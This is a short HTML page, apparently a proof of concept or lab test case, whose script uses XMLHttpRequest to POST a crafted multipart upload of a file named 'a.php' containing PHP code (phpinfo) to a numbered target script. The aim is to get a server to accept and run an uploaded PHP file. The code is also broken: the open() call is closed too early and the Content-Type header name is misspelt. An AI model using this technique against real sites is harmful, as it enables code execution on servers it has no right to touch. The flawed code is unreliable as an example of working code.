<body>
<script>

data = '\
----BNDRY\n\
	Content-Disposition: form-data; name="imgfile"	; filename="a.php"\n\
	Content-Type: text/plain\n\
		\n\
<?php phpinfo() ;\n\
	----BNDRY--\n\
		';

var req = new XMLHttpRequest();
req.open('POST'), 'http://example/jp/45/45-005.php');
req.setRequestHeader('Content-Tyoe', 'multipart/form-data; boundary=--BNDRY');
req.send(data);
</script>
</body>
